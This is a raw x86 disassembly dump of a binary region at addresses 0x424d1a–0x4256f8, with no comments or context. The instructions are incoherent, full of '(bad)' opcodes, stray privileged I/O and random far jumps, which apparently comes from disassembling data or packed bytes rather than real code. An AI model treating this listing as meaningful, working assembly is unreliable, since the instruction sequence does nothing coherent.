  424d1a:	jecxz  0x424cf5
  424d1c:	mov    ah,0xe9
  424d1e:	iret   
  424d1f:	dec    esp
  424d20:	lock dec ebp
  424d22:	dec    esp
  424d23:	shr    DWORD PTR ds:0x7665b752,cl
  424d29:	inc    ebp
  424d2a:	fisttp QWORD PTR [esi+esi*4]
  424d2d:	adc    BYTE PTR [ecx],ch
  424d2f:	imul   esi,ecx,0x55
  424d32:	loopne 0x424cb6
  424d34:	mov    bh,bl
  424d36:	das    
  424d37:	xchg   edx,eax
  424d38:	loope  0x424db5
  424d3a:	lods   al,BYTE PTR ds:[esi]
  424d3b:	into   
  424d3c:	xor    ch,cl
  424d3e:	jno    0x424d5c
  424d40:	mov    bl,0x7a
  424d42:	loopne 0x424d40
  424d44:	or     eax,0x13548f74
  424d49:	dec    esp
  424d4a:	push   ss
  424d4b:	jne    0x424d9a
  424d4d:	pop    esi
  424d4f:	jb     0x424d38
  424d51:	xor    ebx,DWORD PTR [esi-0x29e60b82]
  424d57:	sbb    edx,edx
  424d59:	arpl   bx,si
  424d5b:	jbe    0x424d4c
  424d5d:	jmp    0x9dc1:0x80a834f3
  424d64:	xchg   DWORD PTR [ebx-0x4765e1c1],esi
  424d6a:	test   DWORD PTR [ebx],esp
  424d6c:	push   ebx
  424d6d:	(bad)  
  424d6e:	fisttp DWORD PTR [edx+0xe]
  424d71:	xor    BYTE PTR [edx+eiz*4+0x24],cl
  424d75:	loope  0x424d91
  424d77:	cld    
  424d78:	cmc    
  424d79:	pop    ebx
  424d7a:	inc    eax
  424d7b:	shl    DWORD PTR [esi+0xa],cl
  424d7e:	icebp  
  424d7f:	fadd   QWORD PTR [edi-0x23ca2156]
  424d85:	ficom  DWORD PTR [ecx+0x23e272b9]
  424d8b:	mov    ebp,0xb7d90f6d
  424d90:	(bad)  
  424d91:	jp     0x424d37
  424d93:	in     eax,0x95
  424d95:	mov    ds:0xe8d7ce99,al
  424d9a:	neg    DWORD PTR [esi]
  424d9c:	imul   ecx,eax,0x9db91c9f
  424da2:	cdq    
  424da3:	adc    eax,0x509e695c
  424da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424da9:	push   esi
  424daa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dab:	popa   
  424dac:	mov    dl,0x79
  424dae:	cdq    
  424daf:	sub    eax,DWORD PTR [ecx-0x71]
  424db2:	popa   
  424db3:	cmc    
  424db4:	mov    dh,0xdb
  424db6:	(bad)  
  424db7:	push   edx
  424db8:	fmulp  st(1),st
  424dba:	aas    
  424dbb:	sub    DWORD PTR [edi],ecx
  424dbd:	sub    esp,eax
  424dbf:	pop    esp
  424dc0:	xchg   ecx,eax
  424dc2:	jl     0x424d9e
  424dc4:	jg     0x424e17
  424dc6:	rcr    DWORD PTR [ebx+0x1937a082],cl
  424dcc:	sub    al,0x70
  424dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dcf:	mov    cl,dl
  424dd1:	mov    bl,0xd9
  424dd3:	mov    dh,0xe1
  424dd5:	adc    al,0x7a
  424dd7:	stos   DWORD PTR es:[edi],eax
  424dd8:	xchg   edx,eax
  424dd9:	lahf   
  424dda:	pop    ebx
  424ddb:	scas   al,BYTE PTR es:[edi]
  424ddc:	(bad)  
  424ddd:	xor    dl,BYTE PTR [eax+eiz*4-0x31]
  424de1:	cs fwait
  424de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424de4:	gs push ds
  424de6:	cmc    
  424de7:	jbe    0x424d70
  424de9:	rol    BYTE PTR [edx],0x4d
  424dec:	or     DWORD PTR [eax-0x59],0x1dd61994
  424df3:	mov    ah,0x61
  424df5:	test   BYTE PTR [edi+eiz*2],bl
  424df8:	push   eax
  424df9:	xor    DWORD PTR [edi-0x26cf1342],0xffffffc1
  424e00:	(bad)  
  424e01:	cld    
  424e02:	ds in  al,0xbd
  424e05:	(bad)  
  424e06:	out    dx,al
  424e07:	in     eax,0x61
  424e09:	addr16 aas 
  424e0b:	pop    ebp
  424e0c:	mov    dh,0x9d
  424e0e:	xchg   DWORD PTR [edx+0x0],eax
	...
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ecc
  424e81:	pop    edx
  424e82:	aaa    
  424e83:	mov    ?,WORD PTR [eax+0x4000189]
  424e89:	add    DWORD PTR [eax],eax
  424e8b:	add    BYTE PTR [eax-0x8],al
  424e8e:	inc    ebp
  424e8f:	xchg   esp,eax
  424e90:	xchg   ebp,eax
  424e91:	ret    0x5daa
  424e94:	xchg   BYTE PTR [eax-0xd],dh
  424e97:	dec    ebp
  424e98:	and    al,0xed
  424e9a:	retf   0x4d9f
  424e9d:	lds    ebp,FWORD PTR [esi]
  424e9f:	mov    ecx,eax
  424ea1:	and    eax,edi
  424ea3:	mov    al,ds:0xff89ed87
  424ea8:	je     0x424eaf
  424eaa:	cli    
  424eab:	pop    edi
  424eac:	fisubr DWORD PTR [ebp-0x6b]
  424eaf:	dec    eax
  424eb0:	out    0xb1,eax
  424eb2:	loop   0x424e95
  424eb4:	jo     0x424eaa
  424eb6:	fidiv  DWORD PTR [edi+0x75]
  424eb9:	push   0xd7c44060
  424ebe:	imul   ebp,esp,0xffffffbc
  424ec1:	ss cli 
  424ec3:	cli    
  424ec4:	iret   
  424ec5:	pop    ebp
  424ec6:	push   esi
  424ec7:	aam    0x7e
  424ec9:	push   edi
  424eca:	sub    eax,0xb754deea
  424ecf:	lock sub al,BYTE PTR [ecx+0x62]
  424ed3:	jne    0x424f00
  424ed5:	fst    DWORD PTR [edi]
  424ed7:	cld    
  424ed8:	dec    ebp
  424ed9:	push   esi
  424eda:	rep outs dx,DWORD PTR ds:[esi]
  424edc:	int    0xdb
  424ede:	push   ecx
  424edf:	xor    DWORD PTR [edi],ebx
  424ee1:	mov    esp,0x5bba7367
  424ee6:	popa   
  424ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ee8:	(bad)  
  424ee9:	push   ds
  424eea:	sbb    ecx,ebx
  424eec:	mov    ch,0x4
  424eee:	stos   DWORD PTR es:[edi],eax
  424eef:	ror    eax,cl
  424ef1:	mov    ds:0xf545d39c,eax
  424ef6:	adc    DWORD PTR [edx+ebp*2+0x202f1dfb],0xe2181027
  424f01:	aad    0xd9
  424f03:	mov    BYTE PTR [si],cl
  424f06:	leave  
  424f07:	mov    eax,0x88d3445b
  424f0c:	adc    BYTE PTR [ebp-0x64],bl
  424f0f:	pop    ebx
  424f10:	imul   BYTE PTR [esi]
  424f12:	lods   al,BYTE PTR ds:[esi]
  424f13:	push   ebp
  424f14:	lods   eax,DWORD PTR ds:[esi]
  424f15:	or     ebx,eax
  424f17:	jae    0x424f28
  424f19:	inc    eax
  424f1a:	and    al,0xd9
  424f1c:	push   edx
  424f1d:	daa    
  424f1e:	mov    dh,0x63
  424f20:	popa   
  424f21:	pushf  
  424f22:	les    esi,FWORD PTR [eax]
  424f24:	mov    edi,0xa5320e5d
  424f29:	lahf   
  424f2a:	and    DWORD PTR [ebx+0x50],0xb552d5f1
  424f31:	push   es
  424f32:	pop    ss
  424f33:	pop    eax
  424f34:	cmp    eax,0x6653a7da
  424f39:	inc    ebp
  424f3a:	or     ah,cl
  424f3c:	iret   
  424f3d:	and    ch,bh
  424f3f:	in     al,dx
  424f40:	xor    eax,0xa85cb475
  424f45:	fist   WORD PTR [esi-0x2f2e3ac7]
  424f4b:	sbb    al,0x6a
  424f4d:	pusha  
  424f4e:	dec    ebx
  424f4f:	adc    al,0x5b
  424f51:	pop    edx
  424f52:	mov    esp,0x642c1211
  424f57:	sbb    ebx,edx
  424f59:	jns    0x424f4c
  424f5b:	pusha  
  424f5c:	clc    
  424f5d:	add    dl,BYTE PTR [edx+0x2c]
  424f60:	loopne 0x424f40
  424f62:	fcmovu st,st(2)
  424f64:	add    eax,0x2d582e13
  424f69:	inc    esp
  424f6a:	sub    eax,0xc49c502e
  424f6f:	sahf   
  424f70:	stc    
  424f71:	xchg   esi,eax
  424f72:	push   ss
  424f73:	out    0xf5,eax
  424f75:	pop    esp
  424f76:	(bad)
  424f79:	adc    al,0xee
  424f7b:	cmp    DWORD PTR [ecx+0x46],0xdf8d7062
  424f82:	outs   dx,BYTE PTR ds:[esi]
  424f83:	pop    esp
  424f84:	test   eax,0x2564ef16
  424f89:	cmp    dl,BYTE PTR [eax-0x4b]
  424f8c:	or     eax,0xeef8aa
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	imul   edi,DWORD PTR [edi],0x7
  425003:	stos   BYTE PTR es:[edi],al
  425004:	mov    ah,0x8a
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	mov    ch,0x7a
  42500e:	test   eax,0xf75da38d
  425013:	test   al,0x82
  425015:	sub    al,0x27
  425017:	stos   BYTE PTR es:[edi],al
  425018:	sub    BYTE PTR [eax],bh
  42501a:	dec    ebp
  42501b:	rcr    BYTE PTR [edi+0x2ebeab94],1
  425021:	lea    esi,[edi]
  425023:	sub    ah,ah
  425025:	scas   al,BYTE PTR es:[edi]
  425026:	pop    esi
  425027:	fdivr  QWORD PTR [eax+ebx*1]
  42502a:	jle    0x425068
  42502c:	lea    esp,gs:[ebx-0x4f960d2d]
  425033:	(bad)  
  425034:	out    dx,eax
  425035:	mov    edi,0x7c876f7e
  42503a:	test   DWORD PTR [edx],ecx
  42503c:	dec    esp
  42503d:	shl    al,1
  42503f:	cmp    eax,0x5622a0fc
  425044:	mov    ebx,0xa330ffd6
  425049:	std    
  42504a:	push   ds
  42504b:	sub    bh,BYTE PTR [edx+eiz*1+0x5abe64c1]
  425052:	sar    BYTE PTR [ecx],1
  425054:	lods   al,BYTE PTR ds:[esi]
  425055:	mov    bl,0x1b
  425057:	and    DWORD PTR [ebx+0x651965f],edi
  42505d:	or     DWORD PTR [eax],esp
  42505f:	mov    ds:0x2488247a,eax
  425064:	inc    ecx
  425065:	dec    eax
  425066:	imul   edx,DWORD PTR [edi],0x60
  425069:	cmp    al,0x79
  42506b:	es mov ebp,0x82b60dc0
  425071:	add    esi,DWORD PTR [ecx+0x12e18ad6]
  425077:	jmp    0xb1b57b0a
  42507c:	xor    dh,ah
  42507e:	clc    
  42507f:	jns    0x4250e1
  425081:	pop    ss
  425082:	inc    esi
  425083:	pusha  
  425084:	nop
  425085:	fs cld 
  425087:	in     eax,dx
  425088:	adc    DWORD PTR [eax-0x3a],eax
  42508b:	inc    eax
  42508c:	jecxz  0x4250a1
  42508e:	sahf   
  42508f:	retf   
  425090:	inc    ebp
  425091:	inc    ebp
  425092:	call   0x65e2:0x26c85434
  425099:	sub    ebx,DWORD PTR [esi+0x61e011aa]
  42509f:	mov    ah,0xfe
  4250a1:	mov    ecx,0xf5aa0a7
  4250a6:	call   0x6659749a
  4250ab:	popf   
  4250ac:	dec    eax
  4250ad:	pop    es
  4250ae:	jae    0x42512b
  4250b0:	and    eax,0xb0506330
  4250b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250b6:	xchg   edi,eax
  4250b7:	jp     0x425133
  4250b9:	retf   
  4250ba:	push   eax
  4250bb:	mov    ecx,0x30c46eed
  4250c0:	xor    BYTE PTR [esi],bl
  4250c2:	adc    dh,BYTE PTR cs:[eax-0x414b442f]
  4250c9:	std    
  4250ca:	rol    BYTE PTR [edx+ebx*2+0x13e8438e],cl
  4250d1:	jecxz  0x4250b5
  4250d3:	fidivr DWORD PTR [eax]
  4250d5:	repz stc 
  4250d7:	je     0x425064
  4250d9:	adc    DWORD PTR [edx-0x28],0x13
  4250dd:	sbb    ch,BYTE PTR [esi+0x61]
  4250e0:	push   edx
  4250e1:	clc    
  4250e2:	cmp    dl,al
  4250e4:	int    0xa1
  4250e6:	sbb    DWORD PTR [ebx+0xe],ebp
  4250e9:	adc    al,BYTE PTR [edx+0x16]
  4250ec:	stos   BYTE PTR es:[edi],al
  4250ed:	imul   DWORD PTR [ecx-0x33]
  4250f0:	jl     0x4250f8
  4250f2:	cwde   
  4250f3:	jo     0x42509a
  4250f5:	push   esp
  4250f6:	mov    bl,BYTE PTR [edi*4+0x51de7e16]
  4250fd:	sub    esp,DWORD PTR [ecx-0x51263a1c]
  425103:	mov    bl,0xec
  425105:	lea    esi,[edi+0xd]
  425108:	pop    ss
  425109:	mov    esp,0x94a03c0a
  42510e:	or     eax,DWORD PTR [eax]
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x3772:0x35f492e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    dh,cl
  42518d:	stc    
  42518e:	mov    edx,0x37df68da
  425193:	xor    ah,BYTE PTR [ebp+0x35a52ca1]
  425199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42519a:	xor    esp,DWORD PTR [ebx-0x3e9541a9]
  4251a0:	mov    dh,0x1f
  4251a2:	mov    WORD PTR [ecx+0x8544b6f],fs
  4251a8:	in     al,dx
  4251a9:	mov    ebx,0x8f4ddea8
  4251ae:	dec    esi
  4251af:	outs   dx,BYTE PTR ds:[esi]
  4251b0:	retf   
  4251b1:	jge    0x42522f
  4251b3:	jl     0x42521c
  4251b5:	push   cs
  4251b6:	(bad)  
  4251b7:	push   ss
  4251b8:	shl    BYTE PTR [esi-0x2e3e7052],1
  4251be:	retf   
  4251bf:	retf   0xe0a7
  4251c2:	mov    ah,0x4e
  4251c4:	pop    eax
  4251c5:	add    ebp,ebp
  4251c7:	nop
  4251c8:	xor    DWORD PTR [edi-0x733f8ffa],ebp
  4251ce:	xor    dl,BYTE PTR [eax+eax*4+0x3c657a77]
  4251d5:	aad    0x8c
  4251d7:	mov    bl,0xfd
  4251d9:	in     al,0x92
  4251db:	sub    eax,0xbf989590
  4251e0:	sbb    DWORD PTR [ebp-0x557d89d5],esp
  4251e6:	lds    ebp,FWORD PTR [eax-0x51bd8272]
  4251ec:	inc    esi
  4251ed:	adc    al,0x4a
  4251ef:	sbb    DWORD PTR [eax-0x2],ecx
  4251f2:	rol    BYTE PTR [ecx-0x556f84bf],cl
  4251f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251f9:	cmp    DWORD PTR es:[ebx-0x5],0x1e
  4251fe:	inc    edx
  4251ff:	or     BYTE PTR [eax-0x5a],cl
  425202:	adc    BYTE PTR [ebx-0x1030415],al
  425208:	imul   ebx,DWORD PTR [esi+edx*4],0xbf822573
  42520f:	mov    BYTE PTR [edx+0x6e],bl
  425212:	mov    edx,0x6409c089
  425217:	jae    0x4251cb
  425219:	hlt    
  42521a:	cmp    dh,bl
  42521c:	mov    dl,0xd7
  42521e:	sub    BYTE PTR [ebx+0x66],dh
  425221:	cmc    
  425222:	mov    bl,0x90
  425224:	xor    eax,0xc854fc8c
  425229:	push   esp
  42522a:	pop    DWORD PTR [edx]
  42522c:	jle    0x4251df
  42522e:	loope  0x425231
  425230:	inc    esi
  425231:	mov    WORD PTR [eax+0x9],?
  425234:	xlat   BYTE PTR ds:[ebx]
  425235:	xchg   edx,eax
  425236:	or     ebx,DWORD PTR [edx-0x38]
  425239:	add    al,0x63
  42523b:	xchg   ebp,eax
  42523c:	shl    DWORD PTR [esi+0x2bdbeb2b],0xcd
  425243:	pop    DWORD PTR [edi]
  425245:	push   es
  425246:	dec    edx
  425247:	enter  0xcda9,0xae
  42524b:	js     0x42521a
  42524d:	pop    eax
  42524e:	add    bl,al
  425250:	leave  
  425251:	inc    edx
  425252:	mov    dl,0x1
  425254:	out    dx,eax
  425255:	test   eax,0xb79e26ab
  42525a:	shr    DWORD PTR [eax-0x49],cl
  42525d:	into   
  42525e:	inc    esp
  42525f:	cli    
  425260:	cmp    al,0xf3
  425262:	push   edx
  425263:	adc    DWORD PTR [eax],ecx
  425265:	scas   eax,DWORD PTR es:[edi]
  425266:	fwait
  425267:	pop    ss
  425268:	cdq    
  425269:	mov    bl,ch
  42526b:	fcmovbe st,st(6)
  42526d:	test   al,0xc5
  42526f:	mov    eax,DWORD PTR [eax+0x52]
  425272:	inc    ebp
  425273:	or     eax,0x9b7745a2
  425278:	xor    eax,0xeb406a4a
  42527d:	xchg   DWORD PTR [ecx],eax
  42527f:	(bad)  
  425280:	jne    0x425216
  425282:	retf   
  425283:	jno    0x425244
  425285:	mov    ecx,0xcbbff362
  42528a:	push   edi
  42528b:	add    BYTE PTR [ebx-0x23],bh
  42528e:	sub    ebp,DWORD PTR [eax+0x0]
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	xor    ebx,edi
  425302:	push   esi
  425303:	add    bh,BYTE PTR [esp+ecx*4+0x1040001]
  42530a:	add    BYTE PTR [eax],al
  42530c:	inc    eax
  42530d:	ds aam 0x49
  425310:	add    al,0xb4
  425312:	mov    ds:0xdb9fff5,eax
  425317:	pop    esi
  425318:	sub    al,0x5f
  42531a:	push   es
  42531b:	xchg   BYTE PTR [ebx+ebx*4],cl
  42531e:	sub    BYTE PTR [edi+0x66],0xd1
  425322:	or     eax,0x21587602
  425327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425328:	test   edi,0xf4218cfe
  42532e:	push   esi
  42532f:	test   eax,0x7a2175e8
  425334:	stos   BYTE PTR es:[edi],al
  425335:	or     al,0xe8
  425338:	xchg   BYTE PTR [ebx+ebp*2+0x4a26b812],bh
  42533f:	mov    esp,0xcae7c9b7
  425344:	mov    BYTE PTR [esi+0x5617d8cb],ah
  42534a:	and    al,0x74
  42534c:	sub    DWORD PTR [ebp+0x24],edi
  42534f:	test   DWORD PTR [esp+ebp*2],edi
  425352:	dec    eax
  425353:	adc    bh,BYTE PTR [ecx+ebx*1+0x23]
  425357:	(bad)  
  425358:	out    0xfd,al
  42535a:	xchg   ebx,eax
  42535b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42535c:	cmc    
  42535d:	or     al,0x38
  42535f:	push   0x92e0246d
  425364:	shl    BYTE PTR [ecx],1
  425366:	mov    al,ds:0xa4c4470d
  42536b:	and    DWORD PTR [edx],esp
  42536d:	enter  0x378d,0x7a
  425371:	ds mov ebp,0xf9f73536
  425377:	dec    ecx
  425378:	mov    eax,ds:0x6392c87f
  42537d:	jmp    0x42530b
  42537f:	ret    0x999b
  425382:	jae    0x42532d
  425384:	repnz repz inc ebp
  425387:	jmp    0x4253bd
  425389:	push   ds
  42538a:	mov    ds:0xac83f806,eax
  42538f:	scas   al,BYTE PTR es:[edi]
  425390:	push   ecx
  425391:	js     0x42539b
  425393:	retfw  
  425395:	push   ecx
  425396:	push   edx
  425397:	push   ss
  425398:	rcl    BYTE PTR [ebx+ebp*1+0x1a2f06f4],0x4
  4253a0:	cmp    eax,0x94df1536
  4253a5:	jae    0x425363
  4253a7:	fadd   DWORD PTR [edx+0x33100463]
  4253ad:	add    al,BYTE PTR [edi+edi*4]
  4253b0:	aas    
  4253b1:	push   0x319bfc8f
  4253b6:	or     al,0xeb
  4253b8:	push   ebx
  4253b9:	jg     0x4253f6
  4253bb:	int    0x7f
  4253bd:	jmp    0x2e5b:0xe379d03d
  4253c4:	jecxz  0x4253b0
  4253c6:	or     DWORD PTR [ebp+0x2e],ecx
  4253c9:	dec    ebp
  4253ca:	add    al,0x18
  4253cc:	cwde   
  4253cd:	mov    WORD PTR ds:0xf9759d1,cs
  4253d3:	repz mov esp,0x87405459
  4253d9:	or     al,0x65
  4253db:	pop    esp
  4253dc:	push   edx
  4253dd:	ret    0xeb90
  4253e0:	leave  
  4253e1:	fwait
  4253e2:	jp     0x42538f
  4253e4:	int    0xc5
  4253e6:	push   edi
  4253e7:	dec    esp
  4253e8:	stos   BYTE PTR es:[edi],al
  4253e9:	push   ss
  4253ea:	psubsw mm7,mm6
  4253ed:	xchg   esp,eax
  4253ee:	xor    dl,BYTE PTR [eax]
  4253f0:	pop    eax
  4253f1:	cld    
  4253f2:	(bad)  
  4253f3:	pop    ebp
  4253f4:	and    BYTE PTR [eax-0x26],0xa8
  4253f8:	push   esp
  4253f9:	mov    ebx,0xdd4c9a24
  4253fe:	dec    edx
  4253ff:	popf   
  425400:	jl     0x4253d8
  425402:	xchg   edx,eax
  425403:	and    DWORD PTR [esi+esi*2],ebp
  425406:	mov    ecx,0xf9b41cbd
  42540b:	pop    ecx
  42540c:	dec    ebx
  42540d:	out    dx,eax
  42540e:	inc    edi
  42540f:	dec    esp
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esi,DWORD PTR [ebp-0x3ff67340]
  425485:	lea    eax,[ecx]
  425487:	add    BYTE PTR [ecx+eax*1],al
  42548a:	add    BYTE PTR [eax],al
  42548c:	cmp    ch,BYTE PTR [ebx]
  42548e:	push   ebp
  42548f:	xchg   BYTE PTR [eax-0x3edad78f],dl
  425495:	adc    BYTE PTR [edx-0x4970eca9],dl
  42549b:	lods   al,BYTE PTR ds:[esi]
  42549c:	xchg   BYTE PTR [esi-0xac37605],cl
  4254a2:	pop    edi
  4254a3:	push   eax
  4254a4:	pop    ecx
  4254a5:	outs   dx,BYTE PTR ds:[esi]
  4254a6:	rol    DWORD PTR [ecx],cl
  4254a8:	jb     0x425443
  4254aa:	xchg   ebp,eax
  4254ab:	and    BYTE PTR [eax-0x682d5c5f],0xd0
  4254b2:	lds    edi,FWORD PTR [ebx]
  4254b4:	fisubr WORD PTR [ebp-0x7f3d7064]
  4254ba:	dec    ebp
  4254bb:	xchg   edi,eax
  4254bc:	int3   
  4254bd:	pop    edi
  4254be:	mov    eax,0x378c6457
  4254c3:	inc    esp
  4254c4:	sar    DWORD PTR ds:0x7d969bbe,0x6f
  4254cb:	xor    bl,BYTE PTR [eax]
  4254cd:	repnz sahf 
  4254cf:	mov    al,ds:0xb0fec215
  4254d4:	sbb    BYTE PTR [edx+0x4b],0xaf
  4254d8:	stc    
  4254d9:	cld    
  4254da:	sub    al,bh
  4254dc:	adc    ebx,DWORD PTR [ecx+0x73fb27e1]
  4254e2:	xor    DWORD PTR [esi-0x4d],0x37
  4254e6:	mov    BYTE PTR [esi+0x3fb571e6],bh
  4254ec:	shl    BYTE PTR [eax],0xb9
  4254ef:	aad    0xbc
  4254f1:	outs   dx,DWORD PTR ds:[esi]
  4254f2:	inc    eax
  4254f3:	(bad)  
  4254f4:	and    esi,DWORD PTR [eax+0x110922d7]
  4254fa:	in     al,0x0
  4254fc:	xchg   edi,eax
  4254fd:	jno    0x4254e7
  4254ff:	xchg   ebp,eax
  425500:	neg    edx
  425502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425503:	pop    ebp
  425504:	or     ebx,edi
  425506:	stc    
  425507:	mov    ebp,0xf3493093
  42550c:	sahf   
  42550d:	das    
  42550e:	clc    
  42550f:	ins    DWORD PTR es:[edi],dx
  425510:	xor    esp,ecx
  425512:	in     al,0x15
  425514:	add    ebx,eax
  425516:	pop    ebx
  425517:	je     0x4254a9
  425519:	aad    0x35
  42551b:	pop    es
  42551c:	pop    esi
  42551d:	call   0x536e:0x1a0fbe3b
  425524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425525:	(bad)  
  425526:	(bad)  
  425527:	push   eax
  425528:	out    dx,eax
  425529:	ins    BYTE PTR es:[edi],dx
  42552a:	ins    BYTE PTR es:[edi],dx
  42552b:	sbb    BYTE PTR [edi],al
  42552d:	mov    eax,ds:0xb05d9187
  425532:	jne    0x425556
  425534:	sub    DWORD PTR [esi+0x5c],edi
  425537:	stos   DWORD PTR es:[edi],eax
  425538:	or     BYTE PTR [edx+0x3d],al
  42553b:	inc    esp
  42553c:	push   es
  42553d:	add    al,0xed
  42553f:	je     0x4255b9
  425541:	xchg   DWORD PTR [eax-0x10],esi
  425544:	or     bl,BYTE PTR [edi]
  425546:	xchg   ebp,eax
  425547:	mov    cl,0x78
  425549:	or     eax,0xd5b5ddca
  42554e:	stc    
  42554f:	jl     0x4255a1
  425551:	(bad)  
  425553:	lods   al,BYTE PTR ds:[esi]
  425554:	pushf  
  425555:	popf   
  425556:	xor    BYTE PTR [edi],bl
  425558:	leave  
  425559:	loope  0x425506
  42555b:	jbe    0x425501
  42555d:	pusha  
  42555e:	mov    ch,0xe2
  425560:	pop    esi
  425561:	icebp  
  425562:	mov    esp,0xa67a0f80
  425567:	mov    esp,0x2c731f22
  42556c:	push   0xe40329c3
  425571:	or     dx,WORD PTR [ebx+0x3d]
  425575:	(bad)  
  425576:	aaa    
  425577:	sbb    esi,ebp
  425579:	ja     0x4255ea
  42557b:	mov    esp,0x438e0c2b
  425580:	fcom   DWORD PTR [ecx]
  425582:	xchg   ebx,eax
  425583:	sub    ebp,edi
  425585:	iret   
  425586:	jne    0x425526
  425588:	dec    esi
  425589:	pop    eax
  42558a:	jns    0x425512
  42558c:	loope  0x4255bb
  42558e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
	...
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xa2bcf13a
  425602:	add    esp,esi
  425604:	les    ecx,FWORD PTR [esi+0x1040001]
  42560a:	add    BYTE PTR [eax],al
  42560c:	jle    0x42560e
  42560e:	and    BYTE PTR [eax-0x3c],dh
  425611:	int3   
  425612:	cmc    
  425613:	clc    
  425614:	xor    eax,DWORD PTR [eax]
  425616:	jl     0x42561e
  425618:	pop    esp
  425619:	fisttp QWORD PTR [esi]
  42561b:	rcl    DWORD PTR cs:[edx+0x3ecfd255],1
  425622:	outs   dx,BYTE PTR ds:[esi]
  425623:	lock inc esp
  425625:	aad    0x7d
  425627:	les    ebx,FWORD PTR [ebx+eax*8]
  42562a:	sbb    BYTE PTR [edx-0x28],al
  42562d:	cmp    ch,dh
  42562f:	aas    
  425630:	pop    ebp
  425631:	adc    al,0x76
  425633:	jge    0x425617
  425635:	in     al,dx
  425636:	lds    ebx,FWORD PTR [ebx+0x52d94d93]
  42563c:	add    eax,0x72208a1
  425641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425642:	loope  0x42568b
  425644:	enter  0x4ec8,0x76
  425648:	arpl   bp,bx
  42564a:	add    eax,0xa9a67c53
  42564f:	in     eax,dx
  425650:	jge    0x425622
  425652:	cld    
  425653:	cwde   
  425654:	std    
  425655:	fsub   st,st(7)
  425657:	mov    eax,0x6b4f3670
  42565c:	and    al,0xa3
  42565e:	ins    BYTE PTR es:[edi],dx
  42565f:	sub    BYTE PTR [esi-0x61],dh
  425662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425663:	pop    edx
  425664:	xchg   ebp,eax
  425665:	out    0x7a,eax
  425667:	inc    edi
  425668:	push   0x71d5cc43
  42566d:	fwait
  42566e:	pop    esi
  42566f:	xchg   ecx,eax
  425670:	xchg   esi,eax
  425671:	mov    DWORD PTR [eax-0xa],ebp
  425674:	sub    BYTE PTR [eax+0x36a707fb],cl
  42567a:	or     ebp,eax
  42567c:	xchg   BYTE PTR [ebx],dl
  42567e:	sar    BYTE PTR cs:[ecx-0x49],cl
  425682:	sbb    BYTE PTR [esi-0x35],dh
  425685:	dec    ebp
  425686:	fnsave [esp+ebp*1+0x58e2373f]
  42568d:	fsub   QWORD PTR [ecx]
  42568f:	pop    ds
  425690:	sbb    eax,0x7e022bb9
  425695:	xchg   edx,eax
  425696:	mov    gs,WORD PTR [esi]
  425698:	ins    DWORD PTR es:[edi],dx
  425699:	jg     0x425632
  42569b:	jo     0x4256a2
  42569d:	mov    eax,ds:0xacae531b
  4256a2:	mov    ch,0xfa
  4256a4:	push   edi
  4256a5:	cli    
  4256a6:	ja     0x425631
  4256a8:	jg     0x425698
  4256aa:	push   ebp
  4256ab:	pusha  
  4256ac:	sbb    eax,0x429e7a85
  4256b1:	stos   DWORD PTR es:[edi],eax
  4256b2:	pop    ds
  4256b3:	loopne 0x4256c6
  4256b5:	shr    BYTE PTR [esi],cl
  4256b7:	or     eax,0x48615cf2
  4256bc:	inc    eax
  4256bd:	inc    edx
  4256be:	iret   
  4256bf:	test   DWORD PTR [edx],ebp
  4256c1:	nop
  4256c2:	out    0x32,eax
  4256c4:	mov    ss,WORD PTR [edx]
  4256c6:	push   es
  4256c7:	jmp    0xd9bd:0x866d853b
  4256ce:	fwait
  4256cf:	add    DWORD PTR [esi-0x448eb2af],ebp
  4256d5:	pop    es
  4256d6:	xchg   ebp,eax
  4256d8:	jg     0x42567b
  4256da:	sub    BYTE PTR [ebx],dh
  4256dc:	rcl    DWORD PTR [ecx],0x1
  4256df:	xchg   ebx,eax
  4256e0:	fisttp QWORD PTR [eax-0x47fda8f8]
  4256e6:	sub    DWORD PTR [edi],0x7c
  4256e9:	out    0x48,al
  4256eb:	lea    ebx,[ebx+0xa]
  4256ee:	mov    ch,0xc4
  4256f0:	sub    BYTE PTR [ebp-0x50d5f74f],bh
  4256f6:	add    al,0x32
  4256f8:	or     al,0xc3
